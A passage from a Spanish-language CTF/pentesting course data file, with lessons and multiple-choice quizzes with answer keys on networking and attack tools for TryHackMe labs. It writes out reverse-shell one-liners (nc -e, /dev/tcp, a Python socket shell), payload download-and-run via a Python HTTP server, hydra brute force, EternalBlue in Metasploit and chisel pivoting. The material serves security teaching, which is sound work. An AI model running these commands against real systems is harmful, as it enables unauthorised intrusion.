            codigo: "$ ip a\n1: lo: <LOOPBACK,UP>\n    inet 127.0.0.1/8\n2: eth0: <BROADCAST,UP>\n    inet 192.168.1.100/24\n3: tun0: <POINTOPOINT,UP>    ← VPN de THM\n    inet 10.8.0.2/24\n\n# Tu IP de THM (la que usas en reverse shells):\n$ ip a | grep 'tun0' -A2 | grep 'inet'\n    inet 10.8.0.2/24\n\n$ ip r\ndefault via 192.168.1.1 dev eth0\n10.8.0.0/24 dev tun0",
            output: "1: lo: inet 127.0.0.1/8\n2: eth0: inet 192.168.1.100/24\n3: tun0: inet 10.8.0.2/24\ndefault via 192.168.1.1 dev eth0"
          },
          pregunta: "En TryHackMe, ¿en qué interfaz aparece la IP de tu VPN que usas para reverse shells?",
          opciones: ["eth0", "wlan0", "tun0", "lo"],
          correcta: 2,
          explicacion: "tun0 es la interfaz de VPN (tunnel). Cuando te conectas a THM o HTB con OpenVPN, se crea tun0 con una IP 10.x.x.x. ESA es la IP que debes usar en tus reverse shells (LHOST=tu_IP_tun0), no tu IP local de casa."
        },
        {
          id: "bash-4-2",
          titulo: "ping — Verificar conectividad",
          teoria: "ping verifica si un host está activo enviando paquetes ICMP.\n\n• ping IP → ping continuo\n• ping -c 4 IP → solo 4 paquetes\n• ping -i 0.2 IP → intervalo 0.2 segundos\n• ping6 IPv6 → para IPv6\n\nEn CTFs: ping -c 1 IP confirma que la máquina objetivo está activa antes de escanear.",
          ejemplo: {
            codigo: "$ ping -c 4 10.10.10.1\nPING 10.10.10.1: 56 data bytes\n64 bytes from 10.10.10.1: icmp_seq=0 ttl=64 time=45.2 ms\n64 bytes from 10.10.10.1: icmp_seq=1 ttl=64 time=44.8 ms\n64 bytes from 10.10.10.1: icmp_seq=2 ttl=64 time=45.1 ms\n64 bytes from 10.10.10.1: icmp_seq=3 ttl=64 time=44.9 ms\n\n--- 10.10.10.1 ping statistics ---\n4 packets transmitted, 4 received, 0% packet loss\nrtt min/avg/max = 44.8/45.0/45.2 ms",
            output: "4 packets transmitted, 4 received, 0% packet loss\nrtt min/avg/max = 44.8/45.0/45.2 ms"
          },
          pregunta: "¿Qué indica un TTL de 64 en la respuesta de ping?",
          opciones: [
            "La máquina está muy lejos",
            "La máquina probablemente es Linux/Unix",
            "La máquina está usando Windows",
            "La conexión es lenta"
          ],
          correcta: 1,
          explicacion: "El TTL (Time To Live) da pistas sobre el SO: 64 = Linux/Unix, 128 = Windows, 255 = routers/switches. No es 100% fiable pero es una pista rápida. En CTFs, un TTL de 64 en la máquina objetivo suele confirmar que es Linux."
        },
        {
          id: "bash-4-3",
          titulo: "nmap — El escáner de redes",
          teoria: "nmap es LA herramienta de reconocimiento de redes. Esencial en todo CTF.\n\nEscaneos principales:\n• nmap IP → escaneo básico de 1000 puertos\n• nmap -sV IP → detecta versiones de servicios\n• nmap -sC IP → scripts por defecto\n• nmap -A IP → todo: versiones, scripts, OS, traceroute\n• nmap -p- IP → todos los 65535 puertos\n• nmap -p 80,443,8080 IP → puertos específicos\n• nmap -sU IP → UDP scan\n• nmap -O IP → detectar sistema operativo\n• nmap --script=vuln IP → buscar vulnerabilidades",
          ejemplo: {
            codigo: "$ nmap -sV 10.10.10.1\nStarting Nmap 7.93\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu\n80/tcp   open  http        Apache httpd 2.4.29\n3306/tcp open  mysql       MySQL 5.7.38\n8080/tcp open  http-proxy  Squid http proxy 4.10\n\n# Escaneo completo en CTF:\n$ nmap -sC -sV -oN nmap_initial.txt 10.10.10.1\n\n# Todos los puertos (más lento pero completo):\n$ nmap -p- --min-rate=5000 10.10.10.1",
            output: "22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu\n80/tcp   open  http        Apache httpd 2.4.29\n3306/tcp open  mysql       MySQL 5.7.38\n8080/tcp open  http-proxy  Squid http proxy 4.10"
          },
          pregunta: "¿Qué combinación de opciones de nmap es la más común en CTFs para un escaneo inicial completo?",
          opciones: [
            "nmap -p- IP",
            "nmap -sC -sV IP",
            "nmap -O IP",
            "nmap --script=vuln IP"
          ],
          correcta: 1,
          explicacion: "nmap -sC -sV es el combo estándar: -sV detecta versiones de servicios, -sC ejecuta scripts de detección por defecto. Añade -oN para guardar resultados. En CTFs siempre guardas los resultados de nmap: -oN nmap_initial.txt. La información de versiones es crucial para buscar exploits."
        },
        {
          id: "bash-4-4",
          titulo: "ss y netstat — Conexiones de red",
          teoria: "ss (socket statistics) y netstat muestran conexiones de red activas.\n\nOpciones de ss:\n• ss -tuln → puertos TCP/UDP en escucha\n• ss -tulnp → incluye el proceso\n• ss -s → estadísticas\n\nOpciones de netstat (más antigua):\n• netstat -tuln → puertos en escucha\n• netstat -tulnp → con proceso (requiere root)\n• netstat -an → todas las conexiones\n\nEn CTFs: ss -tulnp muestra servicios corriendo localmente que no son visibles desde fuera.",
          ejemplo: {
            codigo: "$ ss -tuln\nNetid State  Recv-Q Send-Q Local Address:Port\ntcp   LISTEN 0      128    0.0.0.0:22\ntcp   LISTEN 0      80     0.0.0.0:80\ntcp   LISTEN 0      128    127.0.0.1:3306   ← solo local!\ntcp   LISTEN 0      100    127.0.0.1:8080   ← solo local!\n\n# Con procesos (como root):\n$ ss -tulnp\ntcp LISTEN 0 128 0.0.0.0:22  users:((\"sshd\",pid=456))\ntcp LISTEN 0 80  0.0.0.0:80   users:((\"apache2\",pid=789))",
            output: "tcp   LISTEN 0      128    0.0.0.0:22\ntcp   LISTEN 0      80     0.0.0.0:80\ntcp   LISTEN 0      128    127.0.0.1:3306\ntcp   LISTEN 0      100    127.0.0.1:8080"
          },
          pregunta: "En un CTF ejecutas ss -tuln y ves 127.0.0.1:3306. ¿Qué significa esto?",
          opciones: [
            "El puerto 3306 está bloqueado por firewall",
            "MySQL está corriendo pero solo es accesible localmente",
            "El puerto 3306 está cerrado",
            "Hay una conexión activa al puerto 3306"
          ],
          correcta: 1,
          explicacion: "127.0.0.1 significa que el servicio solo escucha en la interfaz de loopback — solo accesible desde la misma máquina. En CTFs esto es importante: MySQL en 127.0.0.1:3306 no aparece en nmap externo pero sí puedes accederlo una vez dentro. Busca credenciales en archivos de config."
        },
        {
          id: "bash-4-5",
          titulo: "ssh — Secure Shell",
          teoria: "SSH (Secure Shell) permite conectarse remotamente a otra máquina de forma cifrada.\n\nConexión básica:\n• ssh usuario@IP → conectar\n• ssh -p 2222 usuario@IP → puerto específico\n• ssh -i id_rsa usuario@IP → usar clave privada\n• ssh -L 8080:127.0.0.1:80 usuario@IP → port forwarding\n• scp archivo usuario@IP:/ruta → copiar archivo\n• ssh-keygen → generar par de claves\n\nEn CTFs: encontrar una clave id_rsa es muy común. chmod 600 id_rsa antes de usarla.",
          ejemplo: {
            codigo: "# Conectar por contraseña:\n$ ssh waldo@10.10.10.1\nwaldo@10.10.10.1's password:\nWelcome to Ubuntu 20.04\nwaldo@victim:~$\n\n# Con clave privada encontrada:\n$ chmod 600 id_rsa\n$ ssh -i id_rsa root@10.10.10.1\nroot@victim:~# id\nuid=0(root) gid=0(root)\n\n# Copiar la flag a tu máquina:\n$ scp waldo@10.10.10.1:/home/waldo/flag.txt .\nflag.txt  100%   25B  0.5KB/s",
            output: "Welcome to Ubuntu 20.04\nwaldo@victim:~$\nroot@victim:~# id\nuid=0(root) gid=0(root)\nflag.txt  100%   25B  0.5KB/s"
          },
          pregunta: "Encuentras un archivo id_rsa en un CTF. ¿Qué debes hacer ANTES de usarlo con ssh -i?",
          opciones: [
            "Ejecutarlo directamente",
            "Copiarlo a /etc/ssh/",
            "Darle permisos chmod 600",
            "Convertirlo con openssl"
          ],
          correcta: 2,
          explicacion: "SSH rechaza claves privadas con permisos demasiado abiertos por seguridad. Siempre: chmod 600 id_rsa antes de usar ssh -i id_rsa. Los permisos 600 (rw-------) significan que solo el dueño puede leer/escribir. Sin esto, ssh da error 'UNPROTECTED PRIVATE KEY FILE'."
        },
        {
          id: "bash-4-6",
          titulo: "nc — Netcat, la navaja suiza",
          teoria: "netcat (nc) es la herramienta más versátil de red. Se usa para:\n\n1. Escuchar conexiones: nc -lp 4444\n2. Conectarse a puertos: nc IP Puerto\n3. Reverse shells: nc -e /bin/bash IP Puerto\n4. Transferir archivos\n5. Banner grabbing: nc IP 80\n\nEn CTFs es FUNDAMENTAL para recibir reverse shells.",
          ejemplo: {
            codigo: "# En TU KALI — escuchar (listener):\n$ nc -lnvp 4444\nListening on 0.0.0.0 4444\n\n# En la VÍCTIMA — conectar de vuelta:\n$ nc -e /bin/bash 10.8.0.2 4444\n\n# De vuelta en tu Kali recibes la shell:\nConnection received on 10.10.10.1 54321\nid\nuid=33(www-data) gid=33(www-data)\n\n# Banner grabbing:\n$ nc 10.10.10.1 80\nGET / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: Apache/2.4.29",
            output: "Listening on 0.0.0.0 4444\nConnection received on 10.10.10.1 54321\nuid=33(www-data) gid=33(www-data)\nHTTP/1.1 200 OK\nServer: Apache/2.4.29"
          },
          pregunta: "¿Qué comando en TU KALI configura un listener para recibir una reverse shell en el puerto 4444?",
          opciones: [
            "nc -e /bin/bash 10.10.10.1 4444",
            "nc -lnvp 4444",
            "nc 0.0.0.0 4444",
            "nc -connect 4444"
          ],
          correcta: 1,
          explicacion: "nc -lnvp 4444: -l=listen (escuchar), -n=no DNS, -v=verbose (muestra conexiones), -p=puerto. Esto crea el 'listener' en tu Kali que espera que la víctima se conecte. Es el comando más ejecutado en CTFs después de encontrar un RCE."
        },
        {
          id: "bash-4-7",
          titulo: "Reverse shells — El concepto",
          teoria: "Una reverse shell es cuando la VÍCTIMA se conecta a TI (no al revés).\n\n¿Por qué? Los firewalls bloquean conexiones entrantes pero permiten salientes. La víctima 'llama de vuelta' a tu Kali.\n\nFlujo:\n1. Tú: nc -lnvp 4444 (escuchas)\n2. Explotás vulnerabilidad en víctima\n3. Víctima ejecuta: nc -e /bin/bash TU_IP 4444\n4. Recibís shell en tu listener\n\nShells en Python (más estables):\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
          ejemplo: {
            codigo: "# Paso 1 - Tu Kali, escuchar:\n$ nc -lnvp 4444\nListening...\n\n# Paso 2 - Inyectas esto en la víctima (RCE):\nbash -i >& /dev/tcp/TU_IP/4444 0>&1\n\n# Alternativa Python:\npython3 -c 'import socket,subprocess,os;\ns=socket.socket();\ns.connect((\"10.8.0.2\",4444));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/sh\"])'\n\n# Mejorar shell básica a TTY:\n$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            output: "Listening on 0.0.0.0 4444\nConnection received on 10.10.10.1 44321\nwww-data@victim:/var/www/html$"
          },
          pregunta: "¿Por qué se usan reverse shells en lugar de bind shells en pentesting?",
          opciones: [
            "Las reverse shells son más rápidas",
            "Las reverse shells evaden firewalls porque la conexión sale desde la víctima",
            "Las reverse shells no requieren netcat",
            "Las bind shells no funcionan en Linux"
          ],
          correcta: 1,
          explicacion: "Los firewalls corporativos bloquean conexiones ENTRANTES pero permiten SALIENTES (para web, email, etc.). Una reverse shell hace que la VÍCTIMA inicie la conexión SALIENTE hacia tu Kali — el firewall lo permite. Una bind shell (víctima escucha, tú te conectas) sería bloqueada por el firewall."
        },
        {
          id: "bash-4-8",
          titulo: "curl avanzado para web hacking",
          teoria: "curl es imprescindible para pentesting web manual.\n\nOpciones avanzadas:\n• curl -u admin:pass URL → Basic Auth\n• curl -c cookies.txt URL → guardar cookies\n• curl -b cookies.txt URL → enviar cookies\n• curl -L URL → seguir redirecciones\n• curl -k URL → ignorar errores SSL\n• curl -A 'Mozilla/5.0' URL → cambiar User-Agent\n• curl --proxy http://127.0.0.1:8080 URL → a través de Burp Suite",
          ejemplo: {
            codigo: "# Probar login:\n$ curl -X POST -d 'username=admin&password=admin' \\\n       http://10.10.10.1/login.php -v 2>&1 | grep 'Location\\|Set-Cookie'\n< Location: /dashboard.php\n< Set-Cookie: PHPSESSID=abc123def456\n\n# Usar la cookie obtenida:\n$ curl -b 'PHPSESSID=abc123def456' http://10.10.10.1/dashboard.php\n<h1>Panel de Administrador</h1>\n\n# Ver headers de error:\n$ curl -I http://10.10.10.1/admin/\nHTTP/1.1 403 Forbidden",
            output: "Location: /dashboard.php\nSet-Cookie: PHPSESSID=abc123def456\n<h1>Panel de Administrador</h1>\nHTTP/1.1 403 Forbidden"
          },
          pregunta: "¿Para qué sirve la opción -v en curl?",
          opciones: [
            "Para guardar la respuesta en un archivo",
            "Para mostrar información detallada incluyendo headers enviados y recibidos",
            "Para hacer el request más rápido",
            "Para verificar certificados SSL"
          ],
          correcta: 1,
          explicacion: "curl -v (verbose) muestra todo: los headers que envías (> ), los headers que recibes (< ), y el body. Es esencial para debugging en web pentesting. Con -v ves cookies, redirecciones, códigos de estado y todo el diálogo HTTP. Úsalo siempre cuando necesitas entender qué está pasando."
        },
        {
          id: "bash-4-9",
          titulo: "Transferencia de archivos en CTF",
          teoria: "Una vez dentro de una máquina CTF, necesitas transferir herramientas como linpeas, pwncat, etc.\n\nMétodos de transferencia:\n\n1. Python HTTP server:\n   Tu Kali: python3 -m http.server 8080\n   Víctima: wget http://TU_IP:8080/herramienta\n\n2. Netcat:\n   Tu Kali: nc -lp 4444 < archivo\n   Víctima: nc TU_IP 4444 > archivo\n\n3. Base64 (cuando no hay netcat ni wget):\n   Kali: base64 herramienta | xclip\n   Víctima: echo 'BASE64...' | base64 -d > herramienta",
          ejemplo: {
            codigo: "# MÉTODO 1 — HTTP server (más fácil)\n# Tu Kali:\n$ cd /opt/tools && python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080...\n\n# En la víctima:\n$ wget http://10.8.0.2:8080/linpeas.sh\n$ chmod +x linpeas.sh\n$ ./linpeas.sh\n\n# MÉTODO 2 — Base64 (sin wget/curl)\n# Tu Kali:\n$ base64 -w 0 linpeas.sh\naHR0cHM6...(base64 muy largo)\n\n# En la víctima:\n$ echo 'aHR0cHM6...' | base64 -d > linpeas.sh",
            output: "Serving HTTP on 0.0.0.0 port 8080...\nlinpeas.sh   100%[=====>] 145K\n[*] LinPEAS starting..."
          },
          pregunta: "¿Qué comando inicia un servidor HTTP simple en Python para transferir archivos a una máquina víctima?",
          opciones: [
            "python3 -m server 8080",
            "python3 -m http.server 8080",
            "python3 httpserver.py 8080",
            "python3 -m SimpleHTTPServer"
          ],
          correcta: 1,
          explicacion: "python3 -m http.server 8080 inicia un servidor HTTP en el puerto 8080 sirviendo el directorio actual. Es el método más común para transferir herramientas en CTFs. Asegúrate de ejecutarlo desde el directorio donde están tus herramientas (linpeas, pspy, etc.)."
        },
        {
          id: "bash-4-10",
          titulo: "Port forwarding con SSH",
          teoria: "El port forwarding de SSH permite acceder a servicios que solo están disponibles localmente en la máquina remota.\n\nTipos:\n• Local forwarding: ssh -L 8080:127.0.0.1:80 usuario@IP\n  → Tu localhost:8080 se conecta al 127.0.0.1:80 de la víctima\n\n• Remote forwarding: ssh -R 4444:127.0.0.1:4444 usuario@IP\n\n• Dynamic forwarding (proxy): ssh -D 9050 usuario@IP\n\nUso típico: víctima tiene MySQL en 127.0.0.1:3306 y quieres acceder desde tu Kali.",
          ejemplo: {
            codigo: "# La víctima tiene web en 127.0.0.1:8080 (no visible desde fuera)\n# Tú tienes acceso SSH a la víctima como waldo\n\n# Tunnel: tu localhost:9090 → víctima:127.0.0.1:8080\n$ ssh -L 9090:127.0.0.1:8080 waldo@10.10.10.1\n\n# Ahora en tu navegador:\n# http://localhost:9090 → accedes a la web interna!\n\n# MySQL tunnel:\n$ ssh -L 3306:127.0.0.1:3306 waldo@10.10.10.1\n# Ahora: mysql -h 127.0.0.1 -u root -p",
            output: "waldo@victim:~$\n# El tunnel está activo mientras dure la conexión SSH"
          },
          pregunta: "¿Para qué sirve el SSH local port forwarding (-L)?",
          opciones: [
            "Para hacer el SSH más rápido",
            "Para acceder desde tu Kali a servicios que solo están disponibles localmente en la máquina víctima",
            "Para cifrar la conexión SSH",
            "Para ejecutar comandos remotos"
          ],
          correcta: 1,
          explicacion: "SSH -L crea un 'túnel' — un puerto en tu máquina local se conecta a través de SSH a un servicio en la máquina remota. Ejemplo: -L 8080:127.0.0.1:80 hace que tu localhost:8080 llegue a la web interna de la víctima. Es esencial para acceder a servicios internos que no están expuestos externamente."
        },
        {
          id: "bash-4-11",
          titulo: "DNS y resolución de nombres",
          teoria: "Herramientas para resolver DNS y descubrir subdominios:\n\n• nslookup dominio → consulta DNS básica\n• dig dominio → consulta DNS detallada\n• dig dominio ANY → todos los registros\n• host dominio → resolución simple\n• dig axfr @ns dominio → transferencia de zona (si está mal configurado)\n\nEn CTFs: añadir IPs a /etc/hosts es muy común cuando la máquina usa virtual hosting.",
          ejemplo: {
            codigo: "$ nslookup 10.10.10.1\n1.10.10.10.in-addr.arpa name = victim.thm.\n\n$ dig victim.thm\n;; ANSWER SECTION:\nvictim.thm.  300  IN  A  10.10.10.1\n\n# Añadir a /etc/hosts:\n$ echo '10.10.10.1 victim.thm admin.victim.thm' >> /etc/hosts\n\n# Ahora puedes usar el nombre:\n$ curl http://admin.victim.thm/\n\n# Enumerar subdominios:\n$ gobuster dns -d victim.thm -w /usr/share/wordlists/dns.txt",
            output: "1.10.10.10.in-addr.arpa name = victim.thm.\nvictim.thm.  300  IN  A  10.10.10.1\n<html><title>Admin Panel</title>"
          },
          pregunta: "En un CTF, la máquina usa virtual hosting. ¿Qué archivo editas para que tu Kali resuelva 'victim.thm' a la IP correcta?",
          opciones: ["/etc/dns.conf", "/etc/resolv.conf", "/etc/hosts", "/etc/hostname"],
          correcta: 2,
          explicacion: "/etc/hosts es el archivo de resolución DNS local. Añadir '10.10.10.1 victim.thm' hace que tu sistema resuelva victim.thm a esa IP sin consultar DNS externo. En CTFs con virtual hosting DEBES hacer esto para que el servidor web devuelva el sitio correcto basado en el nombre de host."
        },
        {
          id: "bash-4-12",
          titulo: "Enumeración web con gobuster",
          teoria: "gobuster descubre directorios y archivos ocultos en servidores web mediante fuerza bruta.\n\nModos principales:\n• gobuster dir -u URL -w wordlist → directorios\n• gobuster dir -u URL -w wordlist -x php,txt,html → con extensiones\n• gobuster dns -d dominio -w wordlist → subdominios\n• gobuster vhost -u URL -w wordlist → virtual hosts\n\nWordlists en Kali:\n• /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n• /usr/share/seclists/Discovery/Web-Content/common.txt",
          ejemplo: {
            codigo: "$ gobuster dir -u http://10.10.10.1 \\\n         -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n         -x php,txt,html\n\n===============================================================\nGobuster v3.5\n===============================================================\n/index.php  (Status: 200) [Size: 4567]\n/admin      (Status: 301) [Size: 314]\n/login.php  (Status: 200) [Size: 1234]\n/secret.txt (Status: 200) [Size: 45]\n/backup     (Status: 403) [Size: 276]",
            output: "/index.php  (Status: 200) [Size: 4567]\n/admin      (Status: 301) [Size: 314]\n/login.php  (Status: 200) [Size: 1234]\n/secret.txt (Status: 200) [Size: 45]\n/backup     (Status: 403) [Size: 276]"
          },
          pregunta: "En los resultados de gobuster, ¿qué código de estado indica que encontraste un directorio que redirige a otro lugar?",
          opciones: ["200", "403", "301", "404"],
          correcta: 2,
          explicacion: "301 es 'Moved Permanently' — el servidor redirige a otra URL (generalmente añadiendo /). Indica que el directorio EXISTE aunque requiera la barra final. 200=OK encontrado, 403=Forbidden existe pero no tienes acceso, 404=No existe. En CTFs un 403 es interesante porque el recurso existe pero está protegido."
        },
        {
          id: "bash-4-13",
          titulo: "Hydra — Brute force de credenciales",
          teoria: "hydra automatiza ataques de fuerza bruta contra servicios de autenticación.\n\nServicios soportados: SSH, FTP, HTTP, MySQL, RDP, y muchos más.\n\nSintaxis:\n• hydra -l usuario -P wordlist servicio://IP\n• hydra -L users.txt -P pass.txt servicio://IP\n• hydra -l admin -P rockyou.txt ssh://IP\n• hydra -l admin -P rockyou.txt http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'\n\nWordlist más usada: /usr/share/wordlists/rockyou.txt",
          ejemplo: {
            codigo: "# Brute force SSH:\n$ hydra -l root -P /usr/share/wordlists/rockyou.txt \\\n        ssh://10.10.10.1 -t 4\n[22][ssh] host: 10.10.10.1  login: root  password: toor\n\n# Brute force HTTP login:\n$ hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n        http-post-form \\\n        '10.10.10.1/login:username=^USER^&password=^PASS^:Invalid credentials'\n[80][http-post-form] host: 10.10.10.1  login: admin  password: admin123\n\n1 of 1 target successfully completed",
            output: "[22][ssh] host: 10.10.10.1  login: root  password: toor\n[80][http-post-form] host: 10.10.10.1  login: admin  password: admin123\n1 of 1 target successfully completed"
          },
          pregunta: "¿Qué wordlist se usa típicamente como primera opción en brute force con hydra?",
          opciones: [
            "/usr/share/wordlists/nmap.lst",
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/wordlists/metasploit/unix_passwords.txt"
          ],
          correcta: 1,
          explicacion: "rockyou.txt contiene 14.3 millones de contraseñas reales filtradas del breach de RockYou en 2009. Es la wordlist más efectiva para contraseñas porque son contraseñas que personas reales usaron. En Kali está en /usr/share/wordlists/rockyou.txt (puede necesitar descomprimirse con gunzip)."
        },
        {
          id: "bash-4-14",
          titulo: "Metasploit básico",
          teoria: "Metasploit Framework es la plataforma de explotación más usada.\n\nComandos básicos:\n• msfconsole → inicia Metasploit\n• search nombre → busca módulos\n• use módulo → selecciona módulo\n• info → información del módulo\n• show options → opciones requeridas\n• set OPCION valor → configura opción\n• run / exploit → ejecuta\n• sessions -l → lista sesiones activas\n• sessions -i 1 → interactúa con sesión 1",
          ejemplo: {
            codigo: "$ msfconsole\nmsf6 > search eternalblue\nModules matching 'eternalblue':\n  exploit/windows/smb/ms17_010_eternalblue\n\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(ms17_010_eternalblue) > show options\nRequired options:\n  RHOSTS  → IP objetivo\n  LHOST   → Tu IP\n  LPORT   → Tu puerto\n\nmsf6 exploit > set RHOSTS 10.10.10.1\nmsf6 exploit > set LHOST 10.8.0.2\nmsf6 exploit > run\n[*] Meterpreter session 1 opened",
            output: "  exploit/windows/smb/ms17_010_eternalblue\nRequired options:\n  RHOSTS, LHOST, LPORT\n[*] Meterpreter session 1 opened"
          },
          pregunta: "En Metasploit, ¿qué comando muestra las opciones que debes configurar antes de ejecutar un exploit?",
          opciones: ["show info", "list options", "show options", "get options"],
          correcta: 2,
          explicacion: "show options muestra todas las opciones del módulo actual, cuáles son Required (obligatorias) y sus valores actuales. Las más comunes: RHOSTS (IP objetivo), LHOST (tu IP para reverse shell), LPORT (tu puerto). Siempre ejecuta show options antes de run para verificar que todo esté configurado."
        },
        {
          id: "bash-4-15",
          titulo: "Enumeración con enum4linux",
          teoria: "enum4linux enumera información de sistemas Windows/Samba:\n\n• enum4linux -a IP → enumeración completa\n• enum4linux -U IP → usuarios\n• enum4linux -S IP → shares (carpetas compartidas)\n• enum4linux -G IP → grupos\n• enum4linux -P IP → política de contraseñas\n\nSamba (SMB) suele estar en el puerto 445. En CTFs con Windows, enum4linux es uno de los primeros comandos.",
          ejemplo: {
            codigo: "$ enum4linux -a 10.10.10.1\n\n[+] Enumerating users using SID S-1-5-21...\nindex: 0x1 RID: 0x1f4 acb: 0x00000010 Account: Administrator\nindex: 0x2 RID: 0x1f5 acb: 0x00000015 Account: Guest\nindex: 0x3 RID: 0x3e8 acb: 0x00000010 Account: john\n\n[+] Share Enumeration:\n    Disk   |   [Maps to /home/]\n    IPC$   |   [IPC Service]\n    secret |   [Secret files here!]",
            output: "Account: Administrator\nAccount: Guest\nAccount: john\nDisk   |   [Maps to /home/]\nsecret |   [Secret files here!]"
          },
          pregunta: "¿En qué puerto generalmente opera SMB/Samba?",
          opciones: ["22", "80", "3306", "445"],
          correcta: 3,
          explicacion: "SMB (Server Message Block) opera en el puerto 445 (y 139 para versiones antiguas). Es el protocolo de compartición de archivos de Windows/Samba. En CTFs, puerto 445 abierto en nmap significa enumerar con enum4linux o smbclient. Fue el vector de ataque de WannaCry (EternalBlue)."
        },
        {
          id: "bash-4-16",
          titulo: "Chisel y proxychains — Pivoting",
          teoria: "El pivoting es usar una máquina comprometida como puente para atacar redes internas.\n\nHerramientas:\n• chisel → tunneling TCP/UDP sobre HTTP\n• proxychains → redirige conexiones a través de proxy\n• ssh -D 9050 → proxy SOCKS dinámico\n\nFlujo típico:\n1. Comprometer máquina A (acceso externo)\n2. Desde A, acceder a máquina B (red interna)\n3. Usar A como puente para atacar B",
          ejemplo: {
            codigo: "# Tu Kali — servidor chisel:\n$ chisel server -p 9001 --reverse\n\n# En la víctima (máquina A):\n$ ./chisel client TU_IP:9001 R:socks\n\n# Tu Kali — configurar proxychains:\n$ echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf\n\n# Ahora puedes atacar la red interna:\n$ proxychains nmap -sT 192.168.100.1\n$ proxychains curl http://192.168.100.10\n$ proxychains ssh user@192.168.100.20",
            output: "2024/06/01 chisel server: Listening on http://0.0.0.0:9001\n2024/06/01 session#1: client connected\nStarting Nmap... HOST IS UP\n192.168.100.1  80/tcp open  http"
          },
          pregunta: "¿Qué es el 'pivoting' en pentesting?",
          opciones: [
            "Cambiar de usuario en el sistema",
            "Usar una máquina comprometida como puente para atacar redes internas no accesibles directamente",
            "Rotar entre diferentes exploits",
            "Cambiar la dirección IP de ataque"
          ],
          correcta: 1,
          explicacion: "Pivoting es usar una máquina comprometida como 'pivote' para acceder a segmentos de red que no son accesibles desde internet. Si comprometiste la DMZ (10.10.10.1) y hay una red interna (192.168.100.0/24), haces pivoting desde la DMZ para atacar la red interna."
        },
        {
          id: "bash-4-17",
          titulo: "Wireshark y tcpdump — Análisis de tráfico",
          teoria: "Para capturar y analizar tráfico de red:\n\n• tcpdump -i eth0 → captura en interfaz eth0\n• tcpdump -i eth0 port 80 → solo puerto 80\n• tcpdump -w captura.pcap → guarda en archivo\n• tcpdump -r captura.pcap → lee archivo\n• tcpdump -A → muestra en ASCII (útil para HTTP)\n• Wireshark → GUI para analizar .pcap\n\nEn CTFs de forense: analizar .pcap para encontrar credenciales, flags o comunicaciones sospechosas.",
          ejemplo: {
            codigo: "# Capturar tráfico HTTP:\n$ tcpdump -i eth0 port 80 -A 2>/dev/null | grep -A5 'POST'\nPOST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin&password=supersecreta123\n\n# Capturar y guardar:\n$ tcpdump -i tun0 -w captura.pcap\n\n# Analizar credenciales en pcap:\n$ tcpdump -r captura.pcap -A | grep 'pass\\|user\\|auth' -i",
            output: "POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nusername=admin&password=supersecreta123"
          },
          pregunta: "En un CTF de forense recibes un archivo .pcap. ¿Qué comando en Kali lo abre con interfaz gráfica?",
          opciones: ["tcpdump -r archivo.pcap", "wireshark archivo.pcap", "netcat archivo.pcap", "tshark -r archivo.pcap"],
          correcta: 1,
          explicacion: "wireshark archivo.pcap abre el archivo con la interfaz gráfica de Wireshark donde puedes filtrar tráfico, seguir streams TCP, exportar objetos HTTP y analizar protocolos visualmente. tshark es la versión de línea de comandos. En CTFs de forense/red, Wireshark es la herramienta principal."
        },
        {
          id: "bash-4-18",
          titulo: "OpenVPN — Conectarse a THM/HTB",
          teoria: "TryHackMe y HackTheBox usan OpenVPN para conectarte a sus redes de máquinas.\n\nPasos para THM:\n1. Descarga tu archivo .ovpn desde la web de THM\n2. Ejecuta: sudo openvpn tu_archivo.ovpn\n3. Verifica: ip a | grep tun0\n4. Esa IP 10.x.x.x es tu LHOST para shells\n\nImportante:\n• Siempre usa tun0 IP en LHOST de reverse shells\n• Si pierdes VPN, el tun0 desaparece\n• Puedes usar el AttackBox de THM si tienes problemas con VPN",
          ejemplo: {
            codigo: "# Conectar a TryHackMe:\n$ sudo openvpn /home/waldo/wcastroquijada.ovpn\n2024-06-01 OpenVPN 2.5.5\n2024-06-01 TUN/TAP device tun0 opened\n2024-06-01 Initialization Sequence Completed\n\n# Verificar conexión:\n$ ip a show tun0\n3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP>\n    inet 10.8.123.45/17\n\n# Tu LHOST para shells es:\n$ echo $LHOST  # debes configurarla\n10.8.123.45",
            output: "2024-06-01 TUN/TAP device tun0 opened\n2024-06-01 Initialization Sequence Completed\n3: tun0: inet 10.8.123.45/17"
          },
          pregunta: "Después de conectarte a la VPN de TryHackMe, ¿qué IP debes usar como LHOST en tus reverse shells?",
          opciones: [
            "Tu IP de casa (eth0)",
            "La IP de la máquina víctima",
            "127.0.0.1",
            "Tu IP de la interfaz tun0"
          ],
          correcta: 3,
          explicacion: "La IP de tun0 es tu dirección dentro de la red de TryHackMe. La máquina víctima está en esa misma red, así que puede conectarse a tu IP de tun0. Tu IP de casa (eth0) no es accesible desde la red de THM. Siempre verifica: ip a | grep tun0 antes de configurar un listener."
        },
        {
          id: "bash-4-19",
          titulo: "Flujo completo de un CTF Linux",
